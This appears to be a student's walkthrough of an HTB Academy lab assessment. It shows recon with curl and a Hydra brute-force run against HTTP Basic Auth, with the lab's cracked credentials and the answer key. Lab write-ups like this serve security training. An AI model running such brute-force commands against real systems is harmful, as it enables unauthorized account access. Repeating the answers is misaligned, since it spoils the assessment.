# Section 12 — Skills Assessment Part 1

---

## Objective

Brute-force a Basic HTTP Auth-protected target. The authenticated page reveals the username needed for Part 2.

---

## Recon

```bash
curl -sv http://TARGET_IP:TARGET_PORT/ 2>&1 | grep -i "www-authenticate\|401"
# Output: WWW-Authenticate: Basic realm="Restricted"
# Confirms: Basic Auth — use http-get module
```
> Checks whether the target uses Basic Auth. `-sv` shows verbose headers. `2>&1` merges stderr into stdout so grep can search both. A `WWW-Authenticate: Basic` header confirms it — use Hydra's `http-get` module.

---

## Attack

```bash
hydra -L ~/SecLists/Usernames/top-usernames-shortlist.txt \
      -P ~/SecLists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
      TARGET_IP http-get / -s TARGET_PORT -f -t 64
```
> Brute-forces Basic Auth at the root path. `-f` stops after the first valid credential. `-t 64` runs 64 concurrent threads. Replace `TARGET_IP` and `TARGET_PORT` with your target's values.

> **Note:** The module references `usernames.txt` and `passwords.txt` — downloadable from the HTB Academy module resources (files icon, top-right). Standard SecLists equivalents work here.

**Output:**
```
[PORT][http-get] host: TARGET_IP   login: admin   password: Admin123
```

---

## Retrieve Part 2 Username

```bash
curl -s -u admin:Admin123 http://TARGET_IP:TARGET_PORT/
```
> Logs in with the cracked credentials and retrieves the page content. `-u user:pass` sends Basic Auth. The page reveals the username needed for Part 2.

**Output:**
```
This is the username you will need for part 2 of the Skills Assessment: satwossh
```

---

## Answers

**Q1 — Password:** `Admin123`
**Q2 — Username for Part 2:** `satwossh`
